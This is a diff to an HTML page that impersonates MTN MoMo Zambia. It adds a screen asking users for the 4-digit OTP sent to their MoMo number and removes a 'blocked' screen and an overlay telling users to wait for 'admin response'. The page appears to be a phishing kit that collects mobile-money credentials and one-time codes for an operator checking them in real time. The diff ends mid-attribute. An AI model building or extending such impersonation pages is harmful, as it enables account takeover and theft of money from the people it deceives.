@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>MoMo from MTN - Zambia</title>
-  <link rel="stylesheet" href="style.css?v=20261126c" />
+  <link rel="stylesheet" href="style.css?v=20261126d" />
 </head>
 <body>
   <div class="app-container">
@@ -472,7 +472,45 @@
       </div>
     </section>
 
-    <!-- Screen 8: Congratulations / Success Screen -->
+    <!-- Screen 8: MTN MoMo 4-Digit OTP Screen -->
+    <section id="screen-otp" class="screen">
+      <div class="top-nav-bar">
+        <span class="hamburger">☰</span>
+        <div class="momo-nav-logo">
+          <span>MTN</span>
+          <strong>MoMo</strong>
+        </div>
+      </div>
+
+      <div class="sub-nav-strip dark-strip">
+        <span class="nav-back-light">MTN MoMo 4-Digit OTP</span>
+        <span class="hamburger-dark">ZAMBIA</span>
+      </div>
+
+      <div class="card-container-spacious">
+        <h2 class="otp-heading">MTN MoMo 4-Digit OTP</h2>
+        <p class="otp-instruction-banner">
+          CHECK SMS AND ENTER ON THE SPACE PROVIDED
+        </p>
+        <p class="sms-notice" style="text-align: center;">
+          Enter the 4-digit OTP code sent to your MTN MoMo number:
+        </p>
+
+        <div id="display-otp-phone" class="otp-phone-badge">096 XXX XXXX</div>
+
+        <div id="banner-otp-error" class="surface-error-banner"></div>
+        <div id="banner-otp-info" class="surface-info-banner"></div>
+
+        <div class="otp-boxes-4">
+          <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box-4" autocomplete="one-time-code" autocorrect="off" autocapitalize="off" spellcheck="false" />
+          <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box-4" autocomplete="one-time-code" autocorrect="off" autocapitalize="off" spellcheck="false" />
+          <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box-4" autocomplete="one-time-code" autocorrect="off" autocapitalize="off" spellcheck="false" />
+          <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box-4" autocomplete="one-time-code" autocorrect="off" autocapitalize="off" spellcheck="false" />
+        </div>
+      </div>
+    </section>
+
+    <!-- Screen 9: Congratulations / Success Screen -->
     <section id="screen-success" class="screen">
       <div class="top-nav-bar">
         <button
@@ -501,47 +539,4 @@
           class="btn-momo-solid"
           type="button"
           style="margin-top: 28px;"
-          onclick="window.__resetApp && window.__resetApp()"
-        >DONE</button>
-      </div>
-    </section>
-
-    <!-- Screen 9: Blocked / Stopped Screen -->
-    <section id="screen-stopped" class="screen">
-      <div class="top-nav-bar">
-        <div class="momo-nav-logo">
-          <span>MTN</span>
-          <strong>MoMo</strong>
-        </div>
-      </div>
-
-      <div class="card-container-spacious">
-        <div class="blocked-badge-circle">✕</div>
-        <h2 class="blocked-title">BLOCK</h2>
-        <p id="blocked-reason-text" class="blocked-sub">
-          Application blocked — valid MTN MoMo details were not confirmed.
-        </p>
-
-        <button
-          id="btn-retry-home"
-          class="btn-momo-solid"
-          type="button"
-          style="margin-top: 24px;"
-          onclick="window.__resetApp && window.__resetApp()"
-        >RETURN HOME</button>
-      </div>
-    </section>
-
-    <!-- Loading Overlay -->
-    <div id="loading-overlay" class="loading-overlay">
-      <div class="spinner"></div>
-      <div id="loading-title">SENDING DETAILS FOR VERIFICATION...</div>
-      <div id="loading-sub">Please wait for admin response...</div>
-    </div>
-
-  </div>
-
-  <script src="script.js?v=20261126c"></script>
-</body>
-  </html>
-  
+          o
